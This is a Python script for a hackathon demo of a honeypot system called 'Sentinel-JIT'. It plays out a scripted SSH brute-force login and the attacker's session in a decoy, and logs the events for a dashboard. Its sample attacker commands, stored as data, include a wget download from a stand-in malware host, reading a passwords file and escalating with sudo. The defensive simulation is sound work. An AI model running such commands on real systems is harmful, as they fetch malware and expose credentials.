# =============================================================================
# live_sim.py  —  Sentinel-JIT Live Attack Simulation
# =============================================================================
#
# For hackathon demo recording. Run this in one terminal window while the
# dashboard is open in the browser at http://localhost:8501
#
# The [SYSTEM] lines are shown here for demo clarity only.
# In a real deployment, the attacker would see none of these messages —
# they would only see the decoy environment responding normally.
#
# Run with:
#   python3 live_sim.py
# =============================================================================

import json
import os
import sys
import time
from datetime import datetime, timezone
from typing import List, Dict

LOG_FILE = "logs.json"

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"
GREY = "\033[90m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

TARGET_IP = "192.168.1.100"
ATTACKER_IP = "192.168.1.45"
TARGET_PORT = 22

PASSWORD_ATTEMPTS = [
    ("admin",  "admin123"),
    ("root",   "root2024"),
    ("ubuntu", "!@#$pass"),
    ("admin",  "p@ssw0rd1"),
    ("root",   "qwerty789"),
    ("admin",  "S3cur3!2024"),
]

DECOY_COMMANDS = [
    ("whoami", "root"),
    ("id", "uid=0(root) gid=0(root)"),
    ("uname -a", "Linux server01 5.15.0 x86_64 GNU/Linux"),
    ("ls", "bin  home  lib  passwords.txt  var"),
    ("cd /home", ""),
    ("cat passwords.txt",
     "admin:hunter2  root:toor  backup:backup123"),
    ("wget http://malware.example.com/malware.sh",
     "Connecting... 100% saved 'malware.sh'"),
    ("sudo su", "root@server01#"),
]


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def slow(text: str, delay: float = 0.035) -> None:
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()


def append_event(event: Dict) -> None:
    events: List[Dict] = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                data = json.load(f)
                if isinstance(data, list):
                    events = data
        except (json.JSONDecodeError, OSError):
            events = []
    events.append(event)
    with open(LOG_FILE, "w") as f:
        json.dump(events, f, indent=2)


def risk_score(events: List[Dict]) -> int:
    failed = sum(
        1 for e in events
        if e.get("type") == "login_attempt"
        and e.get("status") == "failed"
    )
    cmds = sum(
        1 for e in events
        if e.get("type") == "attacker_command"
    )
    return min(100, failed * 10 + cmds * 5)


def main() -> None:

    with open(LOG_FILE, "w") as f:
        json.dump([], f)

    events: List[Dict] = []

    print()
    print(f"{BOLD}{WHITE}Sentinel-JIT  —  Live Attack Simulation{RESET}")
    print(f"{DIM}────────────────────────────────────────{RESET}")
    print(
        f"{GREY}  (Note: lines marked [system] are shown for demo purposes\n"
        f"   only. In a real attack the attacker sees none of these.){RESET}"
    )
    print()
    time.sleep(1.5)

    # ── Phase 1: Initial connection ────────────────────────────────────────
    print(f"{BOLD}Attacker  /  Phase 1 — Gaining Access{RESET}")
    print()
    time.sleep(0.5)

    slow(f"{GREY}$ {RESET}ssh {TARGET_IP} -p {TARGET_PORT}", delay=0.05)
    time.sleep(0.7)
    print(f"{DIM}Connecting to {TARGET_IP}...{RESET}")
    time.sleep(0.8)
    print(f"{GREEN}Connected.{RESET}  SSH-2.0-OpenSSH_8.9")
    print()

    # ── Phase 2: Brute-force login ─────────────────────────────────────────
    decoy_up = False

    for idx, (user, pwd) in enumerate(PASSWORD_ATTEMPTS):
        is_last = idx == len(PASSWORD_ATTEMPTS) - 1
        time.sleep(0.85)

        slow(
            f"{GREY}$ {RESET}Trying  {CYAN}{user}{RESET}"
            f"  password: {DIM}{'*' * len(pwd)}{RESET}",
            delay=0.03
        )
        time.sleep(0.45)

        if is_last:
            status = "success"
            print(f"  {GREEN}Access granted{RESET}")
        else:
            status = "failed"
            print(f"  {RED}Denied{RESET}")

        event = {
            "type":      "login_attempt",
            "ip":        ATTACKER_IP,
            "user":      user,
            "status":    status,
            "timestamp": now_iso(),
        }
        append_event(event)
        events.append(event)

        failed = sum(
            1 for e in events if e.get("status") == "failed"
        )
        score = risk_score(events)

        if not is_last:
            level = (
                f"{RED}HIGH{RESET}" if score >= 70
                else f"{YELLOW}MEDIUM{RESET}" if score >= 40
                else f"{GREY}LOW{RESET}"
            )
            print(
                f"  {DIM}[system]{RESET}  "
                f"{failed} failed attempts   "
                f"risk {score}/100   {level}"
            )

        if not decoy_up and failed >= 3:
            decoy_up = True
            print()
            time.sleep(0.4)
            slow(
                f"  {BOLD}{YELLOW}[system]{RESET}{BOLD}"
                f"  Risk threshold crossed."
                f" Spinning up decoy node...{RESET}",
                delay=0.022
            )
            time.sleep(0.3)
            print(
                f"  {DIM}[system]{RESET}  Decoy is live."
                f" Attacker's next session will be silently"
                f" redirected."
            )
            print()
            time.sleep(0.5)

    # ── Phase 3: Rerouted to decoy ─────────────────────────────────────────
    print()
    print(f"{BOLD}Sentinel-JIT  /  Phase 2 — Rerouting to Decoy{RESET}")
    print()
    time.sleep(0.5)

    slow(
        f"  {DIM}[system]{RESET}  "
        f"Attacker logged in → redirected to "
        f"{CYAN}DECOY-NODE-01{RESET}",
        delay=0.02
    )
    time.sleep(0.4)
    slow(
        f"  {DIM}[system]{RESET}  "
        f"Production server {GREEN}untouched{RESET}."
        f"  Attacker sees a normal shell prompt.",
        delay=0.02
    )
    print()
    time.sleep(0.8)

    # ── Phase 4: Commands in the decoy ─────────────────────────────────────
    print(f"{BOLD}Attacker  /  Phase 3 — Inside the Fake System{RESET}")
    print()
    time.sleep(0.5)

    print(
        f"{GREEN}root@server01{RESET}:{CYAN}~{RESET}# ",
        end="", flush=True
    )
    time.sleep(0.4)

    for cmd, response in DECOY_COMMANDS:
        slow(cmd, delay=0.06)
        time.sleep(0.3)

        if response:
            print(f"  {GREY}{response}{RESET}")

        event = {
            "type":      "attacker_command",
            "ip":        ATTACKER_IP,
            "command":   cmd,
            "timestamp": now_iso(),
        }
        append_event(event)
        events.append(event)

        score = risk_score(events)
        print(
            f"  {DIM}[system]{RESET}  "
            f"Logged.  Risk now {BOLD}{RED}{score}/100{RESET}"
        )

        time.sleep(1.0)
        if cmd != DECOY_COMMANDS[-1][0]:
            print(
                f"\n{GREEN}root@server01{RESET}:{CYAN}~{RESET}# ",
                end="", flush=True
            )

    # ── Summary ────────────────────────────────────────────────────────────
    print()
    print()
    print(f"{BOLD}{GREEN}Sentinel-JIT  —  Attack Captured{RESET}")
    print()

    final = risk_score(events)
    print(f"  Risk Score       {BOLD}{RED}{final}/100{RESET}")
    print(f"  Events captured  {len(events)}")
    print(f"  Commands logged  {len(DECOY_COMMANDS)}")
    print(
        f"  Production       "
        f"{GREEN}Never touched — fully protected{RESET}"
    )
    print()
    print(
        f"  {BOLD}Check the dashboard for the full incident report:{RESET}"
        f"\n  {CYAN}http://localhost:8501{RESET}"
    )
    print()


if __name__ == "__main__":
    main()
